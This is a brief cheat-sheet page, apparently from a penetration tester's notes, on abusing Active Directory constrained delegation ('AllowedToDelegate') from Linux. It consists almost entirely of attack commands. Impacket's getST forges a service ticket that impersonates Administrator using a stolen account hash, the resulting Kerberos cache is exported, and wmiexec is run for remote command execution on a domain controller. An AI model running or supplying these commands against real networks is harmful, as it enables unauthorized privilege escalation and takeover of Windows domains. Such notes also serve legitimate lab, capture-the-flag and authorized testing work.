---
title: "AllowedToDelegate"
date: 2024-7-23
tags: ["AllowedToDelegate", "gMSADumper", "active driectory", "ad", "Windows", "privesc"]
---

---
### Privesc #1: Forge a Ticket (From Linux)

```bash
# For example, spn: www/dc.example.com (Check Bloodhound)
sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator <DOMAIN>/<USER>
```

```bash
# Export ccache
export KRB5CCNAME=Administrator.ccache
```

```bash
# Remote
sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@dc.example.com
```

<small>*Note: impacket-wmiexec may not work*</small>

<br>